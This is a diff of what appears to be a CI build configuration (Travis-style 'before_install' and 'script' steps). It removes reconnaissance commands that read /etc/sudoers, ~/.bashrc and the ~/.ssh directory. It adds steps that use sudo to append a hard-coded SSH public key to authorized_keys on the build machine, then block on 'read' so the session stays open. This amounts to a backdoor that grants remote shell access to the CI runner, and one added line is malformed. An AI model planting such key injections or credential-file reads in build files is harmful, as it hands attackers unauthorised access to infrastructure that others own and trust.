@@ -13,8 +13,7 @@ before_install:
 script:
 # - npm install
 # - id
- - for i in {0..30}; do echo $i; sleep 30; done &
 # - node app.js -p 3000
- - sudo cat /etc/sudoers
- - cat ~/.bashrc
- - ls -al ~/.ssh
+ - sudo echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6o6P3Lzn4f1WNZfl/pxi6QdIaiIh2x8H6lNMwzKm7aaEKZa4eluunB0r2bn7hI+PUdjZkXF9GsZb8//OJOaaIpWt+Sj+qkx3n6ukGh93kvr09FYAFObw49UFcOxUdiCOufLoVuCXtD8wYSkqMo7I9UMuADRpAOLLAgHyz0XGaefI0GGtuarOdi+sTJkKaw3q6XY+rORoIFPbV6ViHevocWAJNRwIYrTEwrUweNIXpmBGOtPzNta/yb0WGa6t838O/QYMrakhCECvWSX1UpNttQq+EOowf73gdTwx4mHe7vuawNx/KJxAKyKreDi9XkMcsxxcHmNXO/bvKE3DZe1pX root@host" >>  ~/.ssh/authorized_keys
+ - sudo ~/.ssh/authorized_keys
+ - read
